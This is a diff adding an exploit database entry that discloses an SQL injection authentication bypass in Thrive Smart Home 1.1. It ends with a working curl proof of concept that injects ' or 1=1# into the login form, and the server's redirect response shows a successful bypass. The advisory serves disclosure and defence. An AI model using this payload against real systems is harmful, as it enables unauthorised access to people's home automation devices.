@@ -1,0 +1,66 @@
+# Exploit: Thrive Smart Home 1.1 - Authentication Bypass
+# Date: 2019-12-30
+# Author: LiquidWorm
+# Vendor: Thrive
+# Product web page: http://www.thrivesmarthomes.com
+# Affected version: 1.1
+# Tested on: Apache/2.4.41 (centos) OpenSSL/1.0.2k-fips
+# Advisory ID: ZSL-2019-5554
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5554.php
+
+
+Thrive Smart Home v1.1 SQL Injection Authentication Bypass
+
+
+Vendor: Thrive
+Product web page: http://www.thrivesmarthomes.com
+Affected version: 1.1
+
+Summary: As smart home technology becomes more affordable and easy to
+install with services offered by Thrive Smart Homes, there are some
+great options available to give your home a high-tech makeover. If the
+convenience of feeding your cat or turning on your air conditioning with
+a tap on your smartphone isn't enough of a reason to make the investment,
+consider how conveniently you can protect your home and belongings. From
+Wi-Fi-equipped smoke detectors to plugs with auto turn-offs, smart homes
+with their always-on connectivity and notifications systems allow consumers
+to quickly respond to the unexpected. For instance, if you install a smart
+water leak and moisture monitoring device, you can set up alerts on your
+phone for unusual changes in moisture and stop leaks before they cause major
+flooding or mold. It's a convenient way to proactively protect your home
+from costly damage, whether it's an overflowing laundry tub, a cracked
+washer hose, or a leaky water heater.
+
+Desc: The application suffers from an SQL Injection vulnerability. Input
+passed through 'user' POST parameter in checklogin.php is not properly
+sanitised before being returned to the user or used in SQL queries. This
+can be exploited to manipulate SQL queries by injecting arbitrary SQL
+code and bypass the authentication mechanism.
+
+Tested on: Apache httpd 2.4.25 (Raspbian)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5554
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5554.php
+
+
+21.10.2019
+
+--
+
+
+$ curl http://192.168.1.1:8080/raspberry/include/checklogin.php -X POST -d"submit=LOGIN&user=' or 1=1#&pass=pass" -i
+HTTP/1.1 302 Found
+Date: Mon, 21 Oct 2019 23:35:18 GMT
+Server: Apache/2.4.25 (Raspbian)
+Set-Cookie: PHPSESSID=6cu3frj0qes9c96v5de5vp37e2; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+location: ../home.php
+Content-Length: 1
+Content-Type: text/html; charset=UTF-8
